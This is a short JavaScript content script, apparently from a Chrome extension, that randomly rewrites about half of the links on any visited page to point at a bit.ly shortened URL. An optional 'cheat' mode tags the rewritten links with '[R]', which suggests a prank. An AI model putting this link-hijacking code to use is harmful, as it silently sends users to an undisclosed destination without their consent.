chrome.runtime.sendMessage({greeting: "hello"}, function(response) {
  console.log(response.farewell);
  localStorage.setItem("on", response.farewell);
  if (localStorage.getItem("on") == "on") {
    var a = document.getElementsByTagName("a");
    for (var i = 0; i < a.length; i++) {
      var random = Math.floor((Math.random() * 2) + 1);
      if (random == 2) {
        a[i].href = "http://bit.ly/30QqsQ2";
        if (localStorage.getItem("cheat") == "on") {
          let prevText = a[i].innerHTML;
          a[i].innerHTML = "[R]" + prevText;
        }
      }
    }
  }
});


chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    location.reload();
  }
);
